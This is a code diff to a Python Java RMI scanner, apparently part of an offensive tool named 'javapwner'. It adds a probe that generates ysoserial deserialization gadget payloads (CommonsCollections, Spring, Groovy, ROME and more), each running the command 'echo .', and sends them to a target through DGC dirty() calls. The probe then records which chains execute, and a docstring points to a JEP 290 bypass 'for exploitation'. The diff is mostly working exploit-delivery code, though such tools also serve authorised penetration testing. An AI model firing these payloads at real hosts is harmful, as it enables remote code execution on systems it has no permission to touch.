@@ -72,6 +72,11 @@ class RmiScanResult:
     urldns_sent: bool = False
     urldns_canary: str | None = None
 
+    # Gadget compatibility probe (populated when detect_gadgets=True)
+    gadgets_compatible: list[str] = field(default_factory=list)
+    gadgets_tested: list[str] = field(default_factory=list)
+    gadgets_detection_skipped: bool = True
+
     # Raw data
     raw_return_bytes: bytes = field(default=b"", repr=False)
     error: str | None = None
@@ -102,6 +107,8 @@ class RmiScanResult:
             "stub_endpoints": self.stub_endpoints,
             "urldns_sent": self.urldns_sent,
             "urldns_canary": self.urldns_canary,
+            "gadgets_compatible": self.gadgets_compatible,
+            "gadgets_detection_skipped": self.gadgets_detection_skipped,
             "error": self.error,
         }
 
@@ -133,6 +140,31 @@ COMMON_RMI_PORTS: tuple[int, ...] = (
     50501,  # JMX RMI (alternate)
     11099,  # JMX RMI (Spring Boot Actuator)
 )
+
+
+# Preferred probe order — most commonly deployed libraries first.
+_PROBE_PRIORITY: tuple[str, ...] = (
+    "CommonsCollections6",   # CC 3.1+, all JDKs — most reliable
+    "CommonsCollections5",   # CC 3.1, JDK >= 8u71
+    "CommonsCollections7",   # CC 3.1
+    "CommonsCollections1",   # CC 3.1, JDK <= 8u70 only
+    "CommonsCollections2",   # CC 4.0
+    "CommonsCollections3",   # CC 3.1, JDK <= 8u70
+    "CommonsCollections4",   # CC 4.0
+    "CommonsBeanutils1",     # commons-beanutils 1.9.x
+    "Spring1",               # Spring Core / Spring AOP
+    "Spring2",               # Spring Core / Spring AOP
+    "Groovy1",               # Groovy 2.3.x
+    "ROME",                  # ROME 1.0
+    "BeanShell1",            # BeanShell 2.0b5
+    "Clojure",               # Clojure 1.x
+    "Jython1",               # Jython 2.5.2
+    "MozillaRhino1",         # Rhino 1.7R2
+    "MozillaRhino2",         # Rhino 1.7R2
+)
+
+# These gadgets don't run OS commands — skip them in the compatibility probe.
+_NON_EXEC_GADGETS: frozenset[str] = frozenset({"URLDNS", "JRMPClient"})
 
 
 class RmiScanner:
@@ -189,6 +221,7 @@ class RmiScanner:
         port: int,
         *,
         urldns_canary: str | None = None,
+        detect_gadgets: bool = False,
     ) -> RmiScanResult:
         """Full scan: JRMP confirm → Registry list → lookup → DGC probe.
 
@@ -197,6 +230,9 @@ class RmiScanner:
         urldns_canary:
             If provided, send a URLDNS payload via DGC dirty() to detect
             blind deserialization. Check DNS logs for resolution.
+        detect_gadgets:
+            If True, probe which ysoserial gadgets are compatible with the
+            target's classpath (requires ysoserial.jar; may be slow).
         """
         result = RmiScanResult(host=host, port=port)
 
@@ -219,7 +255,25 @@ class RmiScanner:
         if urldns_canary:
             self._urldns_probe(host, port, urldns_canary, result)
 
+        # --- Step 5: Gadget compatibility probe (optional) ---
+        if detect_gadgets:
+            self._gadget_probe(host, port, result)
+
         return result
+
+    def probe_gadgets(self, host: str, port: int) -> list[str]:
+        """Return compatible ysoserial gadgets for *host:port*.
+
+        Sends each gadget's payload via DGC dirty() and collects those that
+        do not trigger a ``TC_EXCEPTION`` (meaning the target's classpath
+        contains the required classes and JEP 290 is not filtering them).
+
+        Requires ``ysoserial.jar`` to be accessible (YSOSERIAL_PATH env var
+        or ``lib/ysoserial.jar``).  Returns an empty list on error.
+        """
+        result = RmiScanResult(host=host, port=port)
+        self._gadget_probe(host, port, result)
+        return result.gadgets_compatible
 
     # ------------------------------------------------------------------
     # Internal steps
@@ -346,6 +400,64 @@ class RmiScanner:
                 result.urldns_canary = canary
         except ConnectionError:
             pass
+
+    def _gadget_probe(self, host: str, port: int, result: RmiScanResult) -> None:
+        """Probe which ysoserial gadgets are compatible with the target.
+
+        For each gadget, a payload is generated with a harmless command
+        (``echo .``) and delivered via DGC dirty().  A response without
+        ``TC_EXCEPTION`` means the gadget's classes are on the target's
+        classpath and JEP 290 is not filtering the chain.
+
+        Note: if JEP 290 is active all gadgets will appear incompatible
+        because the filter blocks deserialization before class loading.
+        In that case, use ``--via jep290-bypass`` for exploitation.
+        """
+        try:
+            from javapwner.core.payload import YsoserialWrapper
+            wrapper = YsoserialWrapper()
+            available = set(wrapper.list_gadgets())
+        except Exception:
+            return
+
+        # Build ordered probe list: priority gadgets first, then the rest.
+        to_test: list[str] = [
+            g for g in _PROBE_PRIORITY if g in available and g not in _NON_EXEC_GADGETS
+        ]
+        to_test += sorted(available - set(to_test) - _NON_EXEC_GADGETS)
+
+        compatible: list[str] = []
+        tested: list[str] = []
+
+        for gadget in to_test:
+            try:
+                payload = wrapper.generate(gadget, "echo .")
+            except Exception:
+                continue
+
+            tested.append(gadget)
+            dgc_call = _build_dgc_dirty_call(payload)
+
+            try:
+                with TCPSession(host, port, timeout=self.timeout) as sess:
+                    sess.send(build_jrmp_handshake())
+                    ack = sess.recv(512, exact=False)
+                    if not ack:
+                        continue
+                    try:
+                        parse_jrmp_ack(ack)
+                    except ValueError:
+                        continue
+                    sess.send(dgc_call)
+                    response = sess.recv_all(timeout=_RECV_TIMEOUT)
+                    if not detect_exception_in_stream(response):
+                        compatible.append(gadget)
+            except ConnectionError:
+                continue
+
+        result.gadgets_compatible = compatible
+        result.gadgets_tested = tested
+        result.gadgets_detection_skipped = False
 
     def _dgc_probe(self, host: str, port: int, result: RmiScanResult) -> None:
         """DGC JEP 290 probe using a harmless serialised HashMap."""
